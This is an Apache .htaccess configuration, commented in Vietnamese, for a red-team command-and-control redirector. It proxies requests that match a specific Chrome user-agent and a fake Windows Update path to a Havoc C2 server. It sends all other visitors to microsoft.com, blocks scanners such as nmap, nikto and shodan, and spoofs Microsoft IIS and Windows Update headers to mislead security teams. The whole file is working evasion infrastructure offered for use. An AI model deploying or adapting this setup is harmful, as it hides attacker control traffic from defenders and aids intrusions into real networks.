###########################################################
# ULTIMATE RED TEAM REDIRECTOR - HARDENED VERSION
###########################################################
RewriteEngine On
RewriteBase /

# [PHẦN 1] - KIỂM SOÁT IP (IP ACCESS CONTROL)
# Chỉ cho phép IP của chính bạn (Attacker) truy cập vào các trang quản trị hoặc xem log
# Thay 1.2.3.4 bằng IP thật của máy điều khiển của bạn (nếu có)
<Limit GET POST>
    # Order Allow,Deny
    # Allow from 192.168.209.0/24  <-- Ví dụ: Chỉ cho phép dải mạng nội bộ
</Limit>

# [PHẦN 2] - CHẶN USER-AGENT (BLACKISTING)
# Chặn đứng các loại bot, máy quét và công cụ phân tích từ vòng gửi xe
RewriteCond %{HTTP_USER_AGENT} ^.*(nmap|nikto|nessus|qualys|acunetix|dirbuster|sqlmap|censys|shodan|zgrab|masscan|curl|wget|python|libwww-perl|go-http-client).* [NC]
RewriteRule ^.*$ - [F,L]

# [PHẦN 3] - REWRITE & REDIRECT (THE SECRET GATE)
# Bước nhận diện "người quen": Phải đúng cả User-Agent và cấu trúc URI
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5.0\ \(Windows\ NT\ 10.0;\ Win64;\ x64\)\ Chrome/121.0.0.0 [NC]
RewriteCond %{REQUEST_URI} ^/msdownload/update/v3/static/.* [NC]
# Hành động: Proxy ngầm tới Havoc (10.8.0.2) qua VPN
RewriteRule ^(.*)$ http://10.8.0.2:443/$1 [P,L,NE]

# Nếu không thỏa mãn -> Redirect 302 sang trang Microsoft (SOC View)
RewriteRule ^.*$ https://www.microsoft.com [R=302,L]

# [PHẦN 4] - THIẾT LẬP HEADER BẢO MẬT & GIẢ MẠO (HARDENING)
<IfModule mod_headers.c>
    # 1. Xóa bỏ dấu vết Apache/PHP (Fingerprinting)
    Header unset X-Powered-By
    Header unset Server
    Header unset X-AspNet-Version
    
    # 2. Giả lập Server IIS 10.0 của Microsoft
    Header set Server "Microsoft-IIS/10.0"
    
    # 3. Header bảo mật để tránh bị các công cụ của SOC phân tích ngược
    Header set X-Content-Type-Options "nosniff"
    Header set X-Frame-Options "SAMEORIGIN"
    Header set X-XSS-Protection "1; mode=block"
    Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    
    # 4. Giả lập các Header đặc thù của Windows Update (Tăng độ tin cậy)
    Header set X-CCC "Internal"
    Header set X-CID "MS"
</IfModule>

# [PHẦN 5] - CHẶN TRUY CẬP FILE NHẠY CẢM
# Không cho bất kỳ ai (kể cả SOC) xem được chính file .htaccess này
<Files ".htaccess">
    Order allow,deny
    Deny from all
</Files>
